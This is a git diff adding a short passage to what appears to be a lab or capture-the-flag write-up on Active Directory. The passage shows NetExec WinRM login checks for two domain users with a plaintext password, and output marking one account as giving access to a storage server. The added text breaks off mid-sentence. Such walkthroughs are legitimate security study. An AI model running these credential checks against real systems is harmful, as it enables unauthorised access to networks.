@@ -755,4 +755,16 @@ This user has write on `DC=novaforge.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=
 
 BloodyAD doesnt reveal anything for ryan
 
-But the user `ryan.collins` 
+But the user `ryan.collins` can winrm on both the DC and the storage server which daniel cannot do
+
+```python
+nxc winrm storage.novaforge.local -u ryan.collins -p 'Password123!'
+WINRM       10.0.0.101      5985   STORAGE          [*] Windows 11 / Server 2025 Build 26100 (name:STORAGE) (domain:novaforge.local) 
+WINRM       10.0.0.101      5985   STORAGE          [+] novaforge.local\ryan.collins:Password123! (Pwn3d!)
+
+nxc winrm storage.novaforge.local -u daniel.brooks -p 'Password123!' 
+WINRM       10.0.0.101      5985   STORAGE          [*] Windows 11 / Server 2025 Build 26100 (name:STORAGE) (domain:novaforge.local) 
+WINRM       10.0.0.101      5985   STORAGE          [-] novaforge.local\daniel.brooks:Password123!
+```
+
+So i can use `ryan.collins` to get ac
